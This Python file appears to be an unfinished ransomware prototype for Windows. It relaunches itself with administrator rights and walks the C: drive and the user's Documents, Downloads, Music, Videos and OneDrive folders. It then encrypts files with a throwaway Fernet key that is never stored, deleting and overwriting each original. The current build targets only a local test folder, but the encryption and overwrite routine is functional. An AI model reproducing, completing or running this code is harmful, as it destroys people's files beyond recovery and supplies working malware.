import base64
import ctypes
import hashlib
import os
import random
import string
import subprocess
import sys

from cryptography.fernet import Fernet
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC


# IF not admin
#   Run self with admin
#   kill current self
# Else continue

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


def get_all_accessible_files_in_Dir(init_path: str):
    '''find all the folder it can
    :param:return: return all the folder it could find
    '''
    init_path = f'{init_path}\\'.replace('\\\\','\\')
    files = []
    try:
        for path in os.listdir(init_path):
            path = path.replace('\\\\','\\')
            if os.path.isfile(os.path.join(init_path, path)):
                files.append(init_path + path)
    except:
        print(f'invalide root {init_path}')

    return files


def get_all_accessible_folder_in_dir(init_path: str):
    '''
    :param init_path: where to look in directory
    :return: all the directorys in there
    '''
    folders = []
    try:
        test = os.listdir(init_path)
        for path in os.listdir(init_path):
            if path == 'C:\\users':
                print('users')
            if os.path.isdir(init_path):
                folders.append(init_path + path)
    except:
        print(f'no access to folder : {init_path}')
    return folders


def get_all_accessible():
    ''''
    find all the directorys in the computer
    '''
    #possible_Init = string.ascii_uppercase
    possible_Init = 'C'
    directorys = []
    files = []
    for i in possible_Init:
        init_path = f'{i}:\\'

        try:
            directorys.append(init_path)
            directorys = get_all_accessible_folder_in_dir(init_path)
            files = files + get_all_accessible_files_in_Dir(init_path)
            while len(directorys) != 0:
                for e in directorys:
                    act_dir = get_all_accessible_folder_in_dir(f'{e}\\')
                    files = files + get_all_accessible_files_in_Dir(f'{e}\\')
                    while len(act_dir) != 0:
                        for k in act_dir:
                            act_dir = act_dir + get_all_accessible_folder_in_dir(f'{k}\\')
                            files = files + get_all_accessible_files_in_Dir(f'{k}\\')
                            act_dir.remove(k)
                    directorys.remove(e)
                print(len(directorys))
        except:
            print('lol')
    final = files
    return final


def encrypt_file(file_path: str, F_key: Fernet):
    try_count = 0
    # READ FILE
    with open(file_path, 'rb') as ef:
        data = ef.read()

    # ENCRYPT
    data = F_key.encrypt(data)

    while os.path.isfile(file_path) or try_count <= 5:
        try:
            # DELETE
            os.remove(file_path)
            # REWRITE FILE
            with open(file_path, 'wb') as ef:
                print("rewrite", file_path)
                ef.write(data)
                break
        finally:
            try_count += 1


"""def encrypt_file(file_path,F_key):
    print(f'Encrypthing File : {file_path}')
    try:
         with open(file_path,'rb') as ef:
             data = ef.read()
             print('can oppen the data')
    except:
        print(f'can\'t oppen the file {file_path}')"""

# files = get_all_accessible()
"""for e in files:
    print(encrypt_file(e,cipher))"""


# print(f"The folder returned is : {files}")


# allow the program to call and receive powershell cmd
def powershell(cmd):
    completed = subprocess.run(["powershell", "-Command", cmd], capture_output=True)
    return completed



# Get all user specific informations
def get_user():
    # find the user
    user_dir = (str(powershell('ls ~').stdout).split())[2].replace('\\r', '').replace('\\n', '').replace('Mode','').replace('\\\\', '\\')
    special_folders = ['Music', 'Documents', 'OneDrive', 'Downloads', 'Videos']
    files = []
    unexplore_dir = []
    for e in special_folders:
        temp = os.listdir(f'{user_dir}\\{e}')
        for i in range(len(temp)):
            temp[i] = f'{user_dir}\\{e}\\{temp[i]}'
            if os.path.isfile(temp[i]):
                files.append(temp[i])
            else:
                unexplore_dir.append(temp[i])
    _try = 0
    while len(unexplore_dir) > 0:
        for e in unexplore_dir:
            try:
                temp = os.listdir(e)
                for i in range(len(temp)):
                    temp[i] = f'{e}\\{temp[i]}'
                    if os.path.isfile(temp[i]):
                        files.append(temp[i])
                    else:
                        unexplore_dir.append(temp[i])

                unexplore_dir.remove(e)
                _try = 0

            except:
                _try = _try + 1
                if _try > 2:
                    unexplore_dir.remove(e)
                    _try = 0
                continue
    return files



def main():
    # Look if program is admin
    user_files : []
    files_all : []
    if is_admin():
        user_files = get_user()
        files_all = get_all_accessible()
        print(f'user files : {user_files}')
        input(f'next ?')
        print(files_all)
        files = get_all_accessible_files_in_Dir('.\\encrypt_thing')
        own_dir = os.getcwd()  # get is own directory to not encrypt itself
        key = Fernet.generate_key()  # key generator
        cipher = Fernet(key)  # hash the key
        for e in files:
            if e is not own_dir:
                encrypt_file(e, cipher)  # the file it receive
    else:
        # Re-run the program with admin rights
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    input('its over')


if __name__ == "__main__":
    main()
